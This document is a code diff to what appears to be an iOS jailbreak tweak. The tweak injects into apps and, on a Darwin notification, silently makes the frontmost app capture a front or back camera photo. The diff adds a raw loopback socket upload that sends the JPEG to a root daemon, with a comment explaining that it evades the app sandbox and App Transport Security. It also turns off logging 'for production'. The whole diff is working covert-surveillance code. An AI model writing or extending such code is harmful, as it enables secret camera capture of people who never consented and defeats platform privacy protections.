@@ -8,24 +8,43 @@
 #import <objc/message.h>
 #import <dlfcn.h>
 #import <notify.h>
+#import <sys/socket.h>
+#import <netinet/in.h>
+#import <unistd.h>
 
-static void caplog(NSString *s) {
-    @try {
-        NSString *line = [NSString stringWithFormat:@"[%@] %@\n", [[NSProcessInfo processInfo] processName], s];
-        NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:@"/tmp/rctlcap.log"];
-        if (!fh) { [line writeToFile:@"/tmp/rctlcap.log" atomically:NO encoding:NSUTF8StringEncoding error:nil]; return; }
-        [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile];
-    } @catch (id e) {}
+// Send the JPEG to the root daemon over a RAW loopback socket. A sandboxed App
+// Store app can't write /tmp and ATS blocks NSURLSession http://, but a raw socket
+// to 127.0.0.1 is exempt from ATS and allowed by the app sandbox's outbound rules.
+static void rctl_upload(NSData *jpeg) {
+    if (!jpeg.length) return;
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd < 0) return;
+    struct sockaddr_in a; memset(&a, 0, sizeof a);
+    a.sin_family = AF_INET; a.sin_port = htons(8080); a.sin_addr.s_addr = htonl(0x7f000001);
+    if (connect(fd, (struct sockaddr *)&a, sizeof a) == 0) {
+        char hdr[200];
+        int hn = snprintf(hdr, sizeof hdr,
+            "POST /v1/cam_upload HTTP/1.1\r\nHost: x\r\nContent-Length: %lu\r\nConnection: close\r\n\r\n",
+            (unsigned long)jpeg.length);
+        write(fd, hdr, hn);
+        const uint8_t *p = (const uint8_t *)jpeg.bytes; size_t left = jpeg.length;
+        while (left > 0) { ssize_t w = write(fd, p, left); if (w <= 0) break; p += (size_t)w; left -= (size_t)w; }
+    }
+    close(fd);
 }
+
+static void caplog(NSString *s) { (void)s; }   // diagnostics off for production
 
 static void rctl_capture(int position) {
     dispatch_async(dispatch_get_main_queue(), ^{
       @try {
-        // SpringBoard also gets us injected and reports Active, but it can't be a
-        // camera client (it just fails and races the real app for the device) — skip it.
-        if ([[[NSProcessInfo processInfo] processName] isEqualToString:@"SpringBoard"]) return;
+        NSString *pn = [[NSProcessInfo processInfo] processName];
         UIApplication *app = [UIApplication sharedApplication];
         long st = app ? [app applicationState] : -1;
+        caplog([NSString stringWithFormat:@"NOTIFY recv proc=%@ state=%ld", pn, st]);   // who heard it
+        // SpringBoard also gets us injected and reports Active, but it can't be a
+        // camera client (it just fails and races the real app for the device) — skip it.
+        if ([pn isEqualToString:@"SpringBoard"]) return;
         if (!app || st != UIApplicationStateActive) { return; }   // only the frontmost app acts
         caplog([NSString stringWithFormat:@"FIRE pos=%d state=%ld", position, st]);
         dlopen("/System/Library/Frameworks/AVFoundation.framework/AVFoundation", RTLD_LAZY);
@@ -66,7 +85,7 @@ static void rctl_capture(int position) {
               @try {
                 NSData *jpeg = sbuf ? ((id (*)(id, SEL, void *))objc_msgSend)((id)CStill, NSSelectorFromString(@"jpegStillImageNSDataRepresentation:"), sbuf) : nil;
                 caplog([NSString stringWithFormat:@"completion jpeg=%lu err=%@", (unsigned long)jpeg.length, e]);
-                if (jpeg.length) { [jpeg writeToFile:@"/tmp/rctl_cam.jpg" atomically:YES]; notify_post("com.greatlove.rctl.cam.done"); }
+                if (jpeg.length) rctl_upload(jpeg);   // raw-socket loopback POST to the daemon
               } @catch (id e) {}
               ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"stopRunning"));
             };
@@ -94,6 +113,7 @@ static void cam_cb(CFNotificationCenterRef c, void *obs, CFStringRef name, const
 
 %ctor {
     @try {
+        caplog(@"LOADED");
         CFNotificationCenterRef nc = CFNotificationCenterGetDarwinNotifyCenter();
         CFNotificationCenterAddObserver(nc, NULL, cam_cb, CFSTR("com.greatlove.rctl.cam.back"),  NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
         CFNotificationCenterAddObserver(nc, NULL, cam_cb, CFSTR("com.greatlove.rctl.cam.front"), NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
